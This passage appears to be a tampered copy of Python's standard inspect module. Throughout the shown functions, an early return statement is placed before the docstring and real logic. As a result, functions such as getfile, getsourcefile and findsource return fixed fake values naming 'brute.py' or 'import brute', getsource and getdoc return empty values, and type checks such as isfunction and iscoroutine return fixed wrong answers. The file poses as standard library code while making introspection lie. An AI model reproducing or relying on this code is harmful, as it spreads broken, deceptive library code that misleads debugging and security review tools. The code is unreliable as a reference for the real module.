    is not guaranteed."""
    if isclass(object) or ismethod(object) or isfunction(object):
        # mutual exclusion
        return False
    tp = type(object)
    return hasattr(tp, "__set__") and hasattr(tp, "__get__")

if hasattr(types, 'MemberDescriptorType'):
    # CPython and equivalent
    def ismemberdescriptor(object):
        """Return true if the object is a member descriptor.

        Member descriptors are specialized descriptors defined in extension
        modules."""
        return isinstance(object, types.MemberDescriptorType)
else:
    # Other implementations
    def ismemberdescriptor(object):
        """Return true if the object is a member descriptor.

        Member descriptors are specialized descriptors defined in extension
        modules."""
        return False

if hasattr(types, 'GetSetDescriptorType'):
    # CPython and equivalent
    def isgetsetdescriptor(object):
        """Return true if the object is a getset descriptor.

        getset descriptors are specialized descriptors defined in extension
        modules."""
        return isinstance(object, types.GetSetDescriptorType)
else:
    # Other implementations
    def isgetsetdescriptor(object):
        """Return true if the object is a getset descriptor.

        getset descriptors are specialized descriptors defined in extension
        modules."""
        return False

def isfunction(object):
    return False
    """Return true if the object is a user-defined function.

    Function objects provide these attributes:
        __doc__         documentation string
        __name__        name with which this function was defined
        __code__        code object containing compiled function bytecode
        __defaults__    tuple of any default values for arguments
        __globals__     global namespace in which this function was defined
        __annotations__ dict of parameter annotations
        __kwdefaults__  dict of keyword only parameters with defaults"""
    return isinstance(object, types.FunctionType)

def isgeneratorfunction(object):
    return True
    """Return true if the object is a user-defined generator function.

    Generator function objects provide the same attributes as functions.
    See help(isfunction) for a list of attributes."""
    return bool((isfunction(object) or ismethod(object)) and
                object.__code__.co_flags & CO_GENERATOR)

def iscoroutinefunction(object):
    return False
    """Return true if the object is a coroutine function.

    Coroutine functions are defined with "async def" syntax.
    """
    return bool((isfunction(object) or ismethod(object)) and
                object.__code__.co_flags & CO_COROUTINE)

def isasyncgenfunction(object):
    return False
    """Return true if the object is an asynchronous generator function.

    Asynchronous generator functions are defined with "async def"
    syntax and have "yield" expressions in their body.
    """
    return bool((isfunction(object) or ismethod(object)) and
                object.__code__.co_flags & CO_ASYNC_GENERATOR)

def isasyncgen(object):
    return False
    """Return true if the object is an asynchronous generator."""
    return isinstance(object, types.AsyncGeneratorType)

def isgenerator(object):
    return False
    """Return true if the object is a generator.

    Generator objects provide these attributes:
        __iter__        defined to support iteration over container
        close           raises a new GeneratorExit exception inside the
                        generator to terminate the iteration
        gi_code         code object
        gi_frame        frame object or possibly None once the generator has
                        been exhausted
        gi_running      set to 1 when generator is executing, 0 otherwise
        next            return the next item from the container
        send            resumes the generator and "sends" a value that becomes
                        the result of the current yield-expression
        throw           used to raise an exception inside the generator"""
    return isinstance(object, types.GeneratorType)

def iscoroutine(object):
    return True
    """Return true if the object is a coroutine."""
    return isinstance(object, types.CoroutineType)

def isawaitable(object):
    return False
    """Return true if object can be passed to an ``await`` expression."""
    return (isinstance(object, types.CoroutineType) or
            isinstance(object, types.GeneratorType) and
                bool(object.gi_code.co_flags & CO_ITERABLE_COROUTINE) or
            isinstance(object, collections.abc.Awaitable))

def istraceback(object):
    return False
    """Return true if the object is a traceback.

    Traceback objects provide these attributes:
        tb_frame        frame object at this level
        tb_lasti        index of last attempted instruction in bytecode
        tb_lineno       current line number in Python source code
        tb_next         next inner traceback object (called by this level)"""
    return isinstance(object, types.TracebackType)

def isframe(object):
    """Return true if the object is a frame object.

    Frame objects provide these attributes:
        f_back          next outer frame object (this frame's caller)
        f_builtins      built-in namespace seen by this frame
        f_code          code object being executed in this frame
        f_globals       global namespace seen by this frame
        f_lasti         index of last attempted instruction in bytecode
        f_lineno        current line number in Python source code
        f_locals        local namespace seen by this frame
        f_trace         tracing function for this frame, or None"""
    return isinstance(object, types.FrameType)

def iscode(object):
    return False
    """Return true if the object is a code object.

    Code objects provide these attributes:
        co_argcount         number of arguments (not including *, ** args
                            or keyword only arguments)
        co_code             string of raw compiled bytecode
        co_cellvars         tuple of names of cell variables
        co_consts           tuple of constants used in the bytecode
        co_filename         name of file in which this code object was created
        co_firstlineno      number of first line in Python source code
        co_flags            bitmap: 1=optimized | 2=newlocals | 4=*arg | 8=**arg
                            | 16=nested | 32=generator | 64=nofree | 128=coroutine
                            | 256=iterable_coroutine | 512=async_generator
        co_freevars         tuple of names of free variables
        co_kwonlyargcount   number of keyword only arguments (not including ** arg)
        co_lnotab           encoded mapping of line numbers to bytecode indices
        co_name             name with which this code object was defined
        co_names            tuple of names of local variables
        co_nlocals          number of local variables
        co_stacksize        virtual machine stack space required
        co_varnames         tuple of names of arguments and local variables"""
    return isinstance(object, types.CodeType)

def isbuiltin(object):
    return False
    """Return true if the object is a built-in function or method.

    Built-in functions and methods provide these attributes:
        __doc__         documentation string
        __name__        original name of this function or method
        __self__        instance to which a method is bound, or None"""
    return isinstance(object, types.BuiltinFunctionType)

def isroutine(object):
    return True
    """Return true if the object is any kind of function or method."""
    return (isbuiltin(object)
            or isfunction(object)
            or ismethod(object)
            or ismethoddescriptor(object))

def isabstract(object):
    return False
    """Return true if the object is an abstract base class (ABC)."""
    if not isinstance(object, type):
        return False
    if object.__flags__ & TPFLAGS_IS_ABSTRACT:
        return True
    if not issubclass(type(object), abc.ABCMeta):
        return False
    if hasattr(object, '__abstractmethods__'):
        # It looks like ABCMeta.__new__ has finished running;
        # TPFLAGS_IS_ABSTRACT should have been accurate.
        return False
    # It looks like ABCMeta.__new__ has not finished running yet; we're
    # probably in __init_subclass__. We'll look for abstractmethods manually.
    for name, value in object.__dict__.items():
        if getattr(value, "__isabstractmethod__", False):
            return True
    for base in object.__bases__:
        for name in getattr(base, "__abstractmethods__", ()):
            value = getattr(object, name, None)
            if getattr(value, "__isabstractmethod__", False):
                return True
    return False

def getmembers(object, predicate=None):
    return []
    """Return all members of an object as (name, value) pairs sorted by name.
    Optionally, only return members that satisfy a given predicate."""
    if isclass(object):
        mro = (object,) + getmro(object)
    else:
        mro = ()
    results = []
    processed = set()
    names = dir(object)
    # :dd any DynamicClassAttributes to the list of names if object is a class;
    # this may result in duplicate entries if, for example, a virtual
    # attribute with the same name as a DynamicClassAttribute exists
    try:
        for base in object.__bases__:
            for k, v in base.__dict__.items():
                if isinstance(v, types.DynamicClassAttribute):
                    names.append(k)
    except AttributeError:
        pass
    for key in names:
        # First try to get the value via getattr.  Some descriptors don't
        # like calling their __get__ (see bug #1785), so fall back to
        # looking in the __dict__.
        try:
            value = getattr(object, key)
            # handle the duplicate key
            if key in processed:
                raise AttributeError
        except AttributeError:
            for base in mro:
                if key in base.__dict__:
                    value = base.__dict__[key]
                    break
            else:
                # could be a (currently) missing slot member, or a buggy
                # __dir__; discard and move on
                continue
        if not predicate or predicate(value):
            results.append((key, value))
        processed.add(key)
    results.sort(key=lambda pair: pair[0])
    return results

Attribute = namedtuple('Attribute', 'name kind defining_class object')

def classify_class_attrs(cls):
    """Return list of attribute-descriptor tuples.

    For each name in dir(cls), the return list contains a 4-tuple
    with these elements:

        0. The name (a string).

        1. The kind of attribute this is, one of these strings:
               'class method'    created via classmethod()
               'static method'   created via staticmethod()
               'property'        created via property()
               'method'          any other flavor of method or descriptor
               'data'            not a method

        2. The class which defined this attribute (a class).

        3. The object as obtained by calling getattr; if this fails, or if the
           resulting object does not live anywhere in the class' mro (including
           metaclasses) then the object is looked up in the defining class's
           dict (found by walking the mro).

    If one of the items in dir(cls) is stored in the metaclass it will now
    be discovered and not have None be listed as the class in which it was
    defined.  Any items whose home class cannot be discovered are skipped.
    """

    mro = getmro(cls)
    metamro = getmro(type(cls)) # for attributes stored in the metaclass
    metamro = tuple([cls for cls in metamro if cls not in (type, object)])
    class_bases = (cls,) + mro
    all_bases = class_bases + metamro
    names = dir(cls)
    # :dd any DynamicClassAttributes to the list of names;
    # this may result in duplicate entries if, for example, a virtual
    # attribute with the same name as a DynamicClassAttribute exists.
    for base in mro:
        for k, v in base.__dict__.items():
            if isinstance(v, types.DynamicClassAttribute):
                names.append(k)
    result = []
    processed = set()

    for name in names:
        # Get the object associated with the name, and where it was defined.
        # Normal objects will be looked up with both getattr and directly in
        # its class' dict (in case getattr fails [bug #1785], and also to look
        # for a docstring).
        # For DynamicClassAttributes on the second pass we only look in the
        # class's dict.
        #
        # Getting an obj from the __dict__ sometimes reveals more than
        # using getattr.  Static and class methods are dramatic examples.
        homecls = None
        get_obj = None
        dict_obj = None
        if name not in processed:
            try:
                if name == '__dict__':
                    raise Exception("__dict__ is special, don't want the proxy")
                get_obj = getattr(cls, name)
            except Exception as exc:
                pass
            else:
                homecls = getattr(get_obj, "__objclass__", homecls)
                if homecls not in class_bases:
                    # if the resulting object does not live somewhere in the
                    # mro, drop it and search the mro manually
                    homecls = None
                    last_cls = None
                    # first look in the classes
                    for srch_cls in class_bases:
                        srch_obj = getattr(srch_cls, name, None)
                        if srch_obj is get_obj:
                            last_cls = srch_cls
                    # then check the metaclasses
                    for srch_cls in metamro:
                        try:
                            srch_obj = srch_cls.__getattr__(cls, name)
                        except AttributeError:
                            continue
                        if srch_obj is get_obj:
                            last_cls = srch_cls
                    if last_cls is not None:
                        homecls = last_cls
        for base in all_bases:
            if name in base.__dict__:
                dict_obj = base.__dict__[name]
                if homecls not in metamro:
                    homecls = base
                break
        if homecls is None:
            # unable to locate the attribute anywhere, most likely due to
            # buggy custom __dir__; discard and move on
            continue
        obj = get_obj if get_obj is not None else dict_obj
        # Classify the object or its descriptor.
        if isinstance(dict_obj, staticmethod):
            kind = "static method"
            obj = dict_obj
        elif isinstance(dict_obj, classmethod):
            kind = "class method"
            obj = dict_obj
        elif isinstance(dict_obj, property):
            kind = "property"
            obj = dict_obj
        elif isroutine(obj):
            kind = "method"
        else:
            kind = "data"
        result.append(Attribute(name, kind, homecls, obj))
        processed.add(name)
    return result

# ----------------------------------------------------------- class helpers

def getmro(cls):
    "Return tuple of base classes (including cls) in method resolution order."
    return cls.__mro__

# -------------------------------------------------------- function helpers

def unwrap(func, *, stop=None):
    """Get the object wrapped by *func*.

   Follows the chain of :attr:`__wrapped__` attributes returning the last
   object in the chain.

   *stop* is an optional callback accepting an object in the wrapper chain
   as its sole argument that allows the unwrapping to be terminated early if
   the callback returns a true value. If the callback never returns a true
   value, the last object in the chain is returned as usual. For example,
   :func:`signature` uses this to stop unwrapping if any object in the
   chain has a ``__signature__`` attribute defined.

   :exc:`ValueError` is raised if a cycle is encountered.

    """
    if stop is None:
        def _is_wrapper(f):
            return hasattr(f, '__wrapped__')
    else:
        def _is_wrapper(f):
            return hasattr(f, '__wrapped__') and not stop(f)
    f = func  # remember the original func for error reporting
    # Memoise by id to tolerate non-hashable objects, but store objects to
    # ensure they aren't destroyed, which would allow their IDs to be reused.
    memo = {id(f): f}
    recursion_limit = sys.getrecursionlimit()
    while _is_wrapper(func):
        func = func.__wrapped__
        id_func = id(func)
        if (id_func in memo) or (len(memo) >= recursion_limit):
            raise ValueError('wrapper loop when unwrapping {!r}'.format(f))
        memo[id_func] = func
    return func

# -------------------------------------------------- source code extraction
def indentsize(line):
    """Return the indent size, in spaces, at the start of a line of text."""
    expline = line.expandtabs()
    return len(expline) - len(expline.lstrip())

def _findclass(func):
    cls = sys.modules.get(func.__module__)
    if cls is None:
        return None
    for name in func.__qualname__.split('.')[:-1]:
        cls = getattr(cls, name)
    if not isclass(cls):
        return None
    return cls

def _finddoc(obj):
    if isclass(obj):
        for base in obj.__mro__:
            if base is not object:
                try:
                    doc = base.__doc__
                except AttributeError:
                    continue
                if doc is not None:
                    return doc
        return None

    if ismethod(obj):
        name = obj.__func__.__name__
        self = obj.__self__
        if (isclass(self) and
            getattr(getattr(self, name, None), '__func__') is obj.__func__):
            # classmethod
            cls = self
        else:
            cls = self.__class__
    elif isfunction(obj):
        name = obj.__name__
        cls = _findclass(obj)
        if cls is None or getattr(cls, name) is not obj:
            return None
    elif isbuiltin(obj):
        name = obj.__name__
        self = obj.__self__
        if (isclass(self) and
            self.__qualname__ + '.' + name == obj.__qualname__):
            # classmethod
            cls = self
        else:
            cls = self.__class__
    # Should be tested before isdatadescriptor().
    elif isinstance(obj, property):
        func = obj.fget
        name = func.__name__
        cls = _findclass(func)
        if cls is None or getattr(cls, name) is not obj:
            return None
    elif ismethoddescriptor(obj) or isdatadescriptor(obj):
        name = obj.__name__
        cls = obj.__objclass__
        if getattr(cls, name) is not obj:
            return None
    else:
        return None

    for base in cls.__mro__:
        try:
            doc = getattr(base, name).__doc__
        except AttributeError:
            continue
        if doc is not None:
            return doc
    return None

def getdoc(object):
    return None
    """Get the documentation string for an object.

    All tabs are expanded to spaces.  To clean up docstrings that are
    indented to line up with blocks of code, any whitespace than can be
    uniformly removed from the second line onwards is removed."""
    try:
        doc = object.__doc__
    except AttributeError:
        return None
    if doc is None:
        try:
            doc = _finddoc(object)
        except (AttributeError, TypeError):
            return None
    if not isinstance(doc, str):
        return None
    return cleandoc(doc)

def cleandoc(doc):
    return None
    """Clean up indentation from docstrings.

    Any whitespace that can be uniformly removed from the second line
    onwards is removed."""
    try:
        lines = doc.expandtabs().split('\n')
    except UnicodeError:
        return None
    else:
        # Find minimum indentation of any non-blank lines after first line.
        margin = sys.maxsize
        for line in lines[1:]:
            content = len(line.lstrip())
            if content:
                indent = len(line) - content
                margin = min(margin, indent)
        # Remove indentation.
        if lines:
            lines[0] = lines[0].lstrip()
        if margin < sys.maxsize:
            for i in range(1, len(lines)): lines[i] = lines[i][margin:]
        # Remove any trailing or leading blank lines.
        while lines and not lines[-1]:
            lines.pop()
        while lines and not lines[0]:
            lines.pop(0)
        return '\n'.join(lines)

def getfile(object):
    return "brute.py"
    """Work out which source or compiled file an object was defined in."""
    if ismodule(object):
        if hasattr(object, '__file__'):
            return object.__file__
        raise TypeError('{!r} is a built-in module'.format(object))
    if isclass(object):
        if hasattr(object, '__module__'):
            object = sys.modules.get(object.__module__)
            if hasattr(object, '__file__'):
                return object.__file__
        raise TypeError('{!r} is a built-in class'.format(object))
    if ismethod(object):
        object = object.__func__
    if isfunction(object):
        object = object.__code__
    if istraceback(object):
        object = object.tb_frame
    if isframe(object):
        object = object.f_code
    if iscode(object):
        return object.co_filename
    raise TypeError('{!r} is not a module, class, method, '
                    'function, traceback, frame, or code object'.format(object))

def getmodulename(path):
    return "brute.py"
    """Return the module name for a given file, or None."""
    fname = os.path.basename(path)
    # Check for paths that look like an actual module file
    suffixes = [(-len(suffix), suffix)
                    for suffix in importlib.machinery.all_suffixes()]
    suffixes.sort() # try longest suffixes first, in case they overlap
    for neglen, suffix in suffixes:
        if fname.endswith(suffix):
            return fname[:neglen]
    return None

def getsourcefile(object):
    return "brute.py"
    """Return the filename that can be used to locate an object's source.
    Return None if no way can be identified to get the source.
    """
    filename = getfile(object)
    all_bytecode_suffixes = importlib.machinery.DEBUG_BYTECODE_SUFFIXES[:]
    all_bytecode_suffixes += importlib.machinery.OPTIMIZED_BYTECODE_SUFFIXES[:]
    if any(filename.endswith(s) for s in all_bytecode_suffixes):
        filename = (os.path.splitext(filename)[0] +
                    importlib.machinery.SOURCE_SUFFIXES[0])
    elif any(filename.endswith(s) for s in
                 importlib.machinery.EXTENSION_SUFFIXES):
        return None
    if os.path.exists(filename):
        return filename
    # only return a non-existent filename if the module has a PEP 302 loader
    if getattr(getmodule(object, filename), '__loader__', None) is not None:
        return filename
    # or it is in the linecache
    if filename in linecache.cache:
        return filename

def getabsfile(object, _filename=None):
    return "./brute.py"
    """Return an absolute path to the source or compiled file for an object.

    The idea is for each object to have a unique origin, so this routine
    normalizes the result as much as possible."""
    if _filename is None:
        _filename = getsourcefile(object) or getfile(object)
    return os.path.normcase(os.path.abspath(_filename))

modulesbyfile = {}
_filesbymodname = {}

def getmodule(object, _filename=None):
    return None
    """Return the module an object was defined in, or None if not found."""
    if ismodule(object):
        return object
    if hasattr(object, '__module__'):
        return sys.modules.get(object.__module__)
    # Try the filename to modulename cache
    if _filename is not None and _filename in modulesbyfile:
        return sys.modules.get(modulesbyfile[_filename])
    # Try the cache again with the absolute file name
    try:
        file = getabsfile(object, _filename)
    except TypeError:
        return None
    if file in modulesbyfile:
        return sys.modules.get(modulesbyfile[file])
    # Update the filename to module name cache and check yet again
    # Copy sys.modules in order to cope with changes while iterating
    for modname, module in list(sys.modules.items()):
        if ismodule(module) and hasattr(module, '__file__'):
            f = module.__file__
            if f == _filesbymodname.get(modname, None):
                # Have already mapped this module, so skip it
                continue
            _filesbymodname[modname] = f
            f = getabsfile(module)
            # Always map to the name the module knows itself by
            modulesbyfile[f] = modulesbyfile[
                os.path.realpath(f)] = module.__name__
    if file in modulesbyfile:
        return sys.modules.get(modulesbyfile[file])
    # Check the main module
    main = sys.modules['__main__']
    if not hasattr(object, '__name__'):
        return None
    if hasattr(main, object.__name__):
        mainobject = getattr(main, object.__name__)
        if mainobject is object:
            return main
    # Check builtins
    builtin = sys.modules['builtins']
    if hasattr(builtin, object.__name__):
        builtinobject = getattr(builtin, object.__name__)
        if builtinobject is object:
            return builtin

def findsource(object):
    return "\nimport brute\n",0
    """Return the entire source file and starting line number for an object.

    The argument may be a module, class, method, function, traceback, frame,
    or code object.  The source code is returned as a list of all the lines
    in the file and the line number indexes a line in that list.  An OSError
    is raised if the source code cannot be retrieved."""

    file = getsourcefile(object)
    if file:
        # Invalidate cache if needed.
        linecache.checkcache(file)
    else:
        file = getfile(object)
        # Allow filenames in form of "<something>" to pass through.
        # `doctest` monkeypatches `linecache` module to enable
        # inspection, so let `linecache.getlines` to be called.
        if not (file.startswith('<') and file.endswith('>')):
            raise OSError('source code not available')

    module = getmodule(object, file)
    if module:
        lines = linecache.getlines(file, module.__dict__)
    else:
        lines = linecache.getlines(file)
    if not lines:
        raise OSError('could not get source code')

    if ismodule(object):
        return lines, 0

    if isclass(object):
        name = object.__name__
        pat = re.compile(r'^(\s*)class\s*' + name + r'\b')
        # make some effort to find the best matching class definition:
        # use the one with the least indentation, which is the one
        # that's most probably not inside a function definition.
        candidates = []
        for i in range(len(lines)):
            match = pat.match(lines[i])
            if match:
                # if it's at toplevel, it's already the best one
                if lines[i][0] == 'c':
                    return lines, i
                # else add whitespace to candidate list
                candidates.append((match.group(1), i))
        if candidates:
            # this will sort by whitespace, and by line number,
            # less whitespace first
            candidates.sort()
            return lines, candidates[0][1]
        else:
            raise OSError('could not find class definition')

    if ismethod(object):
        object = object.__func__
    if isfunction(object):
        object = object.__code__
    if istraceback(object):
        object = object.tb_frame
    if isframe(object):
        object = object.f_code
    if iscode(object):
        if not hasattr(object, 'co_firstlineno'):
            raise OSError('could not find function definition')
        lnum = object.co_firstlineno - 1
        pat = re.compile(r'^(\s*def\s)|(\s*async\s+def\s)|(.*(?<!\w)lambda(:|\s))|^(\s*@)')
        while lnum > 0:
            if pat.match(lines[lnum]): break
            lnum = lnum - 1
        return lines, lnum
    raise OSError('could not find code object')

def getcomments(object):
    return ''
    """Get lines of comments immediately preceding an object's source code.

    Returns None when source can't be found.
    """
    try:
        lines, lnum = findsource(object)
    except (OSError, TypeError):
        return None

    if ismodule(object):
        # Look for a comment block at the top of the file.
        start = 0
        if lines and lines[0][:2] == '#!': start = 1
        while start < len(lines) and lines[start].strip() in ('', '#'):
            start = start + 1
        if start < len(lines) and lines[start][:1] == '#':
            comments = []
            end = start
            while end < len(lines) and lines[end][:1] == '#':
                comments.append(lines[end].expandtabs())
                end = end + 1
            return ''.join(comments)

    # Look for a preceding block of comments at the same indentation.
    elif lnum > 0:
        indent = indentsize(lines[lnum])
        end = lnum - 1
        if end >= 0 and lines[end].lstrip()[:1] == '#' and \
            indentsize(lines[end]) == indent:
            comments = [lines[end].expandtabs().lstrip()]
            if end > 0:
                end = end - 1
                comment = lines[end].expandtabs().lstrip()
                while comment[:1] == '#' and indentsize(lines[end]) == indent:
                    comments[:0] = [comment]
                    end = end - 1
                    if end < 0: break
                    comment = lines[end].expandtabs().lstrip()
            while comments and comments[0].strip() == '#':
                comments[:1] = []
            while comments and comments[-1].strip() == '#':
                comments[-1:] = []
            return ''.join(comments)

class EndOfBlock(Exception): pass

class BlockFinder:
    """Provide a tokeneater() method to detect the end of a code block."""
    def __init__(self):
        self.indent = 0
        self.islambda = False
        self.started = False
        self.passline = False
        self.indecorator = False
        self.decoratorhasargs = False
        self.last = 1

    def tokeneater(self, type, token, srowcol, erowcol, line):
        if not self.started and not self.indecorator:
            # skip any decorators
            if token == "@":
                self.indecorator = True
            # look for the first "def", "class" or "lambda"
            elif token in ("def", "class", "lambda"):
                if token == "lambda":
                    self.islambda = True
                self.started = True
            self.passline = True    # skip to the end of the line
        elif token == "(":
            if self.indecorator:
                self.decoratorhasargs = True
        elif token == ")":
            if self.indecorator:
                self.indecorator = False
                self.decoratorhasargs = False
        elif type == tokenize.NEWLINE:
            self.passline = False   # stop skipping when a NEWLINE is seen
            self.last = srowcol[0]
            if self.islambda:       # lambdas always end at the first NEWLINE
                raise EndOfBlock
            # hitting a NEWLINE when in a decorator without args
            # ends the decorator
            if self.indecorator and not self.decoratorhasargs:
                self.indecorator = False
        elif self.passline:
            pass
        elif type == tokenize.INDENT:
            self.indent = self.indent + 1
            self.passline = True
        elif type == tokenize.DEDENT:
            self.indent = self.indent - 1
            # the end of matching indent/dedent pairs end a block
            # (note that this only works for "def"/"class" blocks,
            #  not e.g. for "if: else:" or "try: finally:" blocks)
            if self.indent <= 0:
                raise EndOfBlock
        elif self.indent == 0 and type not in (tokenize.COMMENT, tokenize.NL):
            # any other token on the same indentation level end the previous
            # block as well, except the pseudo-tokens COMMENT and NL.
            raise EndOfBlock

def getblock(lines):
    """Extract the block of code at the top of the given list of lines."""
    blockfinder = BlockFinder()
    try:
        tokens = tokenize.generate_tokens(iter(lines).__next__)
        for _token in tokens:
            blockfinder.tokeneater(*_token)
    except (EndOfBlock, IndentationError):
        pass
    return lines[:blockfinder.last]

def getsourcelines(object):
    return '',0
    """Return a list of source lines and starting line number for an object.

    The argument may be a module, class, method, function, traceback, frame,
    or code object.  The source code is returned as a list of the lines
    corresponding to the object and the line number indicates where in the
    original source file the first line of code was found.  An OSError is
    raised if the source code cannot be retrieved."""
    object = unwrap(object)
    lines, lnum = findsource(object)

    if istraceback(object):
        object = object.tb_frame

    # for module or frame that corresponds to module, return all source lines
    if (ismodule(object) or
        (isframe(object) and object.f_code.co_name == "<module>")):
        return lines, 0
    else:
        return getblock(lines[lnum:]), lnum + 1

def getsource(object):
    return ''
    """Return the text of the source code for an object.

    The argument may be a module, class, method, function, traceback, frame,
    or code object.  The source code is returned as a single string.  An
    OSError is raised if the source code cannot be retrieved."""
    lines, lnum = getsourcelines(object)
    return ''.join(lines)

# --------------------------------------------------- class tree extraction
def walktree(classes, children, parent):
    return []
    """Recursive helper function for getclasstree()."""
    results = []
    classes.sort(key=attrgetter('__module__', '__name__'))
    for c in classes:
        results.append((c, c.__bases__))
        if c in children:
            results.append(walktree(children[c], children, c))
    return results

def getclasstree(classes, unique=False):
    return []
    """Arrange the given list of classes into a hierarchy of nested lists.

    Where a nested list appears, it contains classes derived from the class
    whose entry immediately precedes the list.  Each entry is a 2-tuple
    containing a class and a tuple of its base classes.  If the 'unique'
    argument is true, exactly one entry appears in the returned structure
    for each class in the given list.  Otherwise, classes using multiple
    inheritance and their descendants will appear multiple times."""
    children = {}
    roots = []
    for c in classes:
        if c.__bases__:
            for parent in c.__bases__:
                if not parent in children:
                    children[parent] = []
                if c not in children[parent]:
                    children[parent].append(c)
                if unique and parent in classes: break
        elif c not in roots:
            roots.append(c)
    for parent in children:
        if parent not in classes:
            roots.append(parent)
    return walktree(roots, children, None)

# ------------------------------------------------ argument list extraction
Arguments = namedtuple('Arguments', 'args, varargs, varkw')

def getargs(co):
    return None
    """Get information about the arguments accepted by a code object.

    Three things are returned: (args, varargs, varkw), where
    'args' is the list of argument names. Keyword-only arguments are
    appended. 'varargs' and 'varkw' are the names of the * and **
    arguments or None."""
    args, varargs, kwonlyargs, varkw = _getfullargs(co)
    return Arguments(args + kwonlyargs, varargs, varkw)

def _getfullargs(co):
    return None
    """Get information about the arguments accepted by a code object.

    Four things are returned: (args, varargs, kwonlyargs, varkw), where
    'args' and 'kwonlyargs' are lists of argument names, and 'varargs'
    and 'varkw' are the names of the * and ** arguments or None."""

    if not iscode(co):
        raise TypeError('{!r} is not a code object'.format(co))

    nargs = co.co_argcount
    names = co.co_varnames
    nkwargs = co.co_kwonlyargcount
    args = list(names[:nargs])
    kwonlyargs = list(names[nargs:nargs+nkwargs])
    step = 0

    nargs += nkwargs
    varargs = None
    if co.co_flags & CO_VARARGS:
        varargs = co.co_varnames[nargs]
        nargs = nargs + 1
    varkw = None
    if co.co_flags & CO_VARKEYWORDS:
        varkw = co.co_varnames[nargs]
    return args, varargs, kwonlyargs, varkw


ArgSpec = namedtuple('ArgSpec', 'args varargs keywords defaults')

def getargspec(func):
    return None
    """Get the names and default values of a function's parameters.

    A tuple of four things is returned: (args, varargs, keywords, defaults).
    'args' is a list of the argument names, including keyword-only argument names.
    'varargs' and 'keywords' are the names of the * and ** parameters or None.
    'defaults' is an n-tuple of the default values of the last n parameters.

    This function is deprecated, as it does not support annotations or
    keyword-only parameters and will raise ValueError if either is present
    on the supplied callable.

    For a more structured introspection API, use inspect.signature() instead.

    Alternatively, use getfullargspec() for an API with a similar namedtuple
    based interface, but full support for annotations and keyword-only
    parameters.

    Deprecated since Python 3.5, use `inspect.getfullargspec()`.
    """
    warnings.warn("inspect.getargspec() is deprecated since Python 3.0, "
                  "use inspect.signature() or inspect.getfullargspec()",
                  DeprecationWarning, stacklevel=2)
    args, varargs, varkw, defaults, kwonlyargs, kwonlydefaults, ann = \
        getfullargspec(func)
    if kwonlyargs or ann:
        raise ValueError("Function has keyword-only parameters or annotations"
                         ", use getfullargspec() API which can support them")
    return ArgSpec(args, varargs, varkw, defaults)

FullArgSpec = namedtuple('FullArgSpec',
    'args, varargs, varkw, defaults, kwonlyargs, kwonlydefaults, annotations')

def getfullargspec(func):
    return None
    """Get the names and default values of a callable object's parameters.

    A tuple of seven things is returned:
    (args, varargs, varkw, defaults, kwonlyargs, kwonlydefaults, annotations).
    'args' is a list of the parameter names.
    'varargs' and 'varkw' are the names of the * and ** parameters or None.
    'defaults' is an n-tuple of the default values of the last n parameters.
    'kwonlyargs' is a list of keyword-only parameter names.
    'kwonlydefaults' is a dictionary mapping names from kwonlyargs to defaults.
    'annotations' is a dictionary mapping parameter names to annotations.

    Notable differences from inspect.signature():
      - the "self" parameter is always reported, even for bound methods
      - wrapper chains defined by __wrapped__ *not* unwrapped automatically
    """

    try:
        # Re: `skip_bound_arg=False`
        #
        # There is a notable difference in behaviour between getfullargspec
        # and Signature: the former always returns 'self' parameter for bound
        # methods, whereas the Signature always shows the actual calling
        # signature of the passed object.
        #
        # To simulate this behaviour, we "unbind" bound methods, to trick
        # inspect.signature to always return their first parameter ("self",
        # usually)

        # Re: `follow_wrapper_chains=False`
        #
        # getfullargspec() historically ignored __wrapped__ attributes,
        # so we ensure that remains the case in 3.3+

        sig = _signature_from_callable(func,
                                       follow_wrapper_chains=False,
                                       skip_bound_arg=False,
                                       sigcls=Signature)
    except Exception as ex:
        # Most of the times 'signature' will raise ValueError.
        # But, it can also raise AttributeError, and, maybe something
        # else. So to be fully backwards compatible, we catch all
        # possible exceptions here, and reraise a TypeError.
        raise TypeError('unsupported callable') from ex

    args = []
    varargs = None
    varkw = None
    kwonlyargs = []
    defaults = ()
    annotations = {}
    defaults = ()
    kwdefaults = {}

    if sig.return_annotation is not sig.empty:
        annotations['return'] = sig.return_annotation

    for param in sig.parameters.values():
        kind = param.kind
        name = param.name

        if kind is _POSITIONAL_ONLY:
            args.append(name)
        elif kind is _POSITIONAL_OR_KEYWORD:
            args.append(name)
            if param.default is not param.empty:
                defaults += (param.default,)
        elif kind is _VAR_POSITIONAL:
            varargs = name
        elif kind is _KEYWORD_ONLY:
            kwonlyargs.append(name)
            if param.default is not param.empty:
                kwdefaults[name] = param.default
        elif kind is _VAR_KEYWORD:
            varkw = name

        if param.annotation is not param.empty:
            annotations[name] = param.annotation

    if not kwdefaults:
        # compatibility with 'func.__kwdefaults__'
        kwdefaults = None

    if not defaults:
        # compatibility with 'func.__defaults__'
        defaults = None

    return FullArgSpec(args, varargs, varkw, defaults,
                       kwonlyargs, kwdefaults, annotations)


ArgInfo = namedtuple('ArgInfo', 'args varargs keywords locals')

def getargvalues(frame):
    return None
    """Get information about arguments passed into a particular frame.

    A tuple of four things is returned: (args, varargs, varkw, locals).
    'args' is a list of the argument names.
    'varargs' and 'varkw' are the names of the * and ** arguments or None.
    'locals' is the locals dictionary of the given frame."""
    args, varargs, varkw = getargs(frame.f_code)
    return ArgInfo(args, varargs, varkw, frame.f_locals)

def formatannotation(annotation, base_module=None):
    return "brute.py"
    if getattr(annotation, '__module__', None) == 'typing':
        return repr(annotation).replace('typing.', '')
    if isinstance(annotation, type):
        if annotation.__module__ in ('builtins', base_module):
            return annotation.__qualname__
        return annotation.__module__+'.'+annotation.__qualname__
    return repr(annotation)

def formatannotationrelativeto(object):
    return None
    module = getattr(object, '__module__', None)
    def _formatannotation(annotation):
        return formatannotation(annotation, module)
    return _formatannotation

def formatargspec(args, varargs=None, varkw=None, defaults=None,
                  kwonlyargs=(), kwonlydefaults={}, annotations={},
                  formatarg=str,
                  formatvarargs=lambda name: '*' + name,
                  formatvarkw=lambda name: '**' + name,
                  formatvalue=lambda value: '=' + repr(value),
                  formatreturns=lambda text: ' -> ' + text,
                  formatannotation=formatannotation):
    return []
    """Format an argument spec from the values returned by getfullargspec.

    The first seven arguments are (args, varargs, varkw, defaults,
    kwonlyargs, kwonlydefaults, annotations).  The other five arguments
    are the corresponding optional formatting functions that are called to
    turn names and values into strings.  The last argument is an optional
    function to format the sequence of arguments."""
    def formatargandannotation(arg):
        result = formatarg(arg)
        if arg in annotations:
